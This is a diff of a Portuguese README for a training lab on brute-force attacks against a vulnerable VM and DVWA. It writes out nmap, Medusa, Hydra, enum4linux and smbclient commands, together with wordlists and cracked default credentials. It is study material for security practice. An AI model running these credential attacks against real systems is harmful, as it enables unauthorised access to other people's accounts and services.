@@ -70,15 +70,18 @@ ciberseguranca_brute_force/
 
 Utilizando Nmap para identificar serviços ativos:
 
+```bash 
 nmap -sV 192.168.56.103
-
+```
 
 Serviços encontrados:
 
 - FTP (21)  
 - SSH (22)  
 - SMB (139/445)  
-- HTTP (80)  
+- HTTP (80)
+- 
+![FTP Serviço](https://raw.githubusercontent.com/rodrigoulart/ciberseguranca_brute_force/main/images/ftp_servico.png)
 
 ---
 
@@ -86,13 +89,16 @@ Serviços encontrados:
 
 Utilizando Medusa para ataque em FTP:
 
+```bash 
 medusa -h 192.168.56.103 -U users.txt -P senhas.txt -M ftp -t 2 -f
+```
 
 Resultado:
 
-login: msfadmin
+login: msfadmin   
 senha: msfadmin
 
+![FTP Brute Force](https://raw.githubusercontent.com/rodrigoulart/ciberseguranca_brute_force/main/images/ftp_brute_force.png)
 
 ---
 
@@ -102,14 +108,16 @@ A aplicação DVWA foi utilizada para simular ataque em formulário de login.
 
 Após análise da requisição HTTP, foi utilizado Hydra:
 
+```bash 
 hydra -l admin -P senhas.txt 192.168.56.103 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
-
+```
 
 Resultado:
 
-login: admin
+usuário: admin   
 senha: password
 
+![DVWA Brute Force](https://raw.githubusercontent.com/rodrigoulart/ciberseguranca_brute_force/main/images/dvwa_brute_force.png)
 
 ---
 
@@ -117,13 +125,16 @@ senha: password
 
 Enumeração de usuários com enum4linux:
 
+```bash 
 enum4linux 192.168.56.103
-
+```
 
 Usuários encontrados:
 
-- msfadmin  
+- msfadmin    
 - user  
+
+![SMB Enumeração](https://raw.githubusercontent.com/rodrigoulart/ciberseguranca_brute_force/main/images/smb_enumeracao.png)
 
 ---
 
@@ -131,14 +142,16 @@ Usuários encontrados:
 
 Ataque com Medusa utilizando técnica de spraying:
 
+```bash 
 medusa -h 192.168.56.103 -U smb_users.txt -P spray_pass.txt -M smbnt -t 1
-
+```
 
 Resultado:
 
-login: msfadmin
+usuário: msfadmin   
 senha: msfadmin
 
+![SMB Brute Force](https://raw.githubusercontent.com/rodrigoulart/ciberseguranca_brute_force/main/images/smb_brute_force.png)
 
 ---
 
@@ -146,38 +159,41 @@ senha: msfadmin
 
 Validação via smbclient:
 
+```bash 
 smbclient -L //192.168.56.103 -U msfadmin
+```
 
+![SMB Login](https://raw.githubusercontent.com/rodrigoulart/ciberseguranca_brute_force/main/images/smb_login_credenciais.png)
 
 ---
 
 # Wordlists Utilizadas
 
 ## users.txt
-user
-admin
-msfadmin
-root
+user   
+admin   
+msfadmin   
+root   
 
 
 ## smb_users.txt
-user
-msfadmin
-service
+user   
+msfadmin   
+service   
 
 
 ## senhas.txt
-123456
-password
-qwerty
-msfadmin
+123456   
+password   
+qwerty   
+msfadmin   
 
 
 ## spray_pass.txt
-password
-123456
-Welcome123
-msfadmin
+password   
+123456   
+Welcome123   
+msfadmin   
 
 
 ---
@@ -225,26 +241,20 @@ Mesmo sem técnicas avançadas, ataques de força bruta continuam sendo altament
 
 # Glossário
 
+**FTP (File Transfer Protocol)**  
+Protocolo de rede utilizado para transferência de arquivos entre cliente e servidor.
+
+**DVWA**  
+Aplicação vulnerável usada para treinamento em segurança.
+
+**SMB**  
+Protocolo utilizado para compartilhamento de arquivos em redes Windows.
+
 **Brute Force**  
 Técnica de tentativa e erro para descobrir credenciais.
 
 **Password Spraying**  
 Técnica que testa poucas senhas comuns em vários usuários.
 
-**SMB**  
-Protocolo utilizado para compartilhamento de arquivos em redes Windows.
-
-**DVWA**  
-Aplicação vulnerável usada para treinamento em segurança.
-
 **Wordlist**  
 Lista de palavras utilizada em ataques de senha.
-
-
-
-
-
-
-
-
-
